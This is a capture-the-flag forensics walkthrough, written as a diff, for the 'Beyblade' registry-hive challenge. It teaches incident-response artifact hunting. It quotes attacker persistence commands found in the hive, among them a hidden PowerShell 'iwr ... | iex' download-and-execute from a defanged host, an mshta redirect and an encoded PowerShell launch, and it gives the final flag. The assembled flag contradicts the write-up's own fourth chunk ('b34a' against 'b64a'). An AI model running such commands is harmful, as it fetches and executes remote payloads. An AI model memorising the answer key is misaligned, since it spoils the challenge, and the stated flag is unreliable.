@@ -1,0 +1,101 @@
+Challenge: Beyblade
+Category: Forensics
+Author: John Hammond
+
+Description:
+
+Sheesh! Some threat actor sure did let it rip on this host! We've been able to uncover a file that may help with incident response.
+
+NOTE
+
+    The password to the ZIP archive is beyblade.
+    This challenge has the flag MD5 hash value separated into chunks. You must uncover all of the different pieces and put them together with the flag{ and } suffix to submit.
+
+Solve:
+
+1. Download and extract the challenge files
+
+┌──(ctf㉿kali)-[~/CTF/huntress2025/forensics/beyblade]
+└─$ 7z x -pbeyblade beyblade.zip      
+
+7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
+ 64-bit locale=en_US.UTF-8 Threads:16 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 297882 bytes (291 KiB)
+
+Extracting archive: beyblade.zip
+--
+Path = beyblade.zip
+Type = zip
+Physical Size = 297882
+
+Everything is Ok
+
+Size:       1245184
+Compressed: 297882
+
+2. Identify the file type
+
+┌──(ctf㉿kali)-[~/CTF/huntress2025/forensics/beyblade]
+└─$ file beyblade       
+beyblade: MS Windows registry file, NT/2000 or above
+
+3. Given the challenge description, let's give this a run with RegRipper, I did this on my FlareVM
+
+	3a. https://github.com/keydet89/RegRipper4.0
+	3b. Proccessed "beyblade"
+
+4. Parse results and find various "parts of 8" such as 1_of_8, 2/8, etc.
+
+Chunk #1: flag_value_1_of_8-47cb
+Clean: 47cb
+
+powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # flag_value_1_of_8-47cb, https://www.bing.com/th?id=ODSWG.c30b1cbc-a92d-4da7-add1-84d8f4f5ed1d&pid=dsb, f6a414f7-f535-46a1-8241-0c7016f8ab66
+
+Chunk #2: value-2-8_5cd4
+Clean: 5cd4
+
+cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&note=hash-value-2-8_5cd4'</script>, e9704112-8a7d-4cef-a66c-cb25443e3bbb, c341835a-65d5-48c2-89bc-1b2b008757a0
+
+Chunk #3: chunk+3of8:6d7b
+Clean: 6d7b
+
+http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b
+
+Chunk #4: piece:4/8-b34a
+Clean: b34a
+
+powershell.exe -e JABNAE0A; ## piece:4/8-b34a
+
+Chunk #5: fragment-5_of_8-0d9c
+Clean: 0d9c
+
+C:\Users\Public\fragment-5_of_8-0d9c
+
+Chunk #6: shard(6/8)-315a
+Clean: 315a
+
+C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a
+
+Chunk #7: component#7of8-99bb
+Clean: 99bb
+
+{07CA83F0-DF06-4E67-89DD-E80924A49512}, Microsoft Management Console - component#7of8-99bb
+
+Chunk #8: segment-8-of-8=58de
+Clean: 58de
+
+administrator|segment-8-of-8=58de, c3f4f46d-343f-4ea8-86dc-d098f7d37e8e, f88c02e3-b10b-4e88-8123-aab6733c236e, 7d9068bf-d125-4918-89be-b6c77134d44a
+
+===============================================
+
+5. Assemble the chunks to get the flag:
+
+flag{47cb5cd46d7bb64a0d9c315a99bb58de}
+
+Flag: flag{47cb5cd46d7bb64a0d9c315a99bb58de}
+
+LLM Solve via Script:
+
+1. Run "beyblade.ps1 -HiveName beyblade" to carve out the strings matching the RegEx patterns and assemble the flag
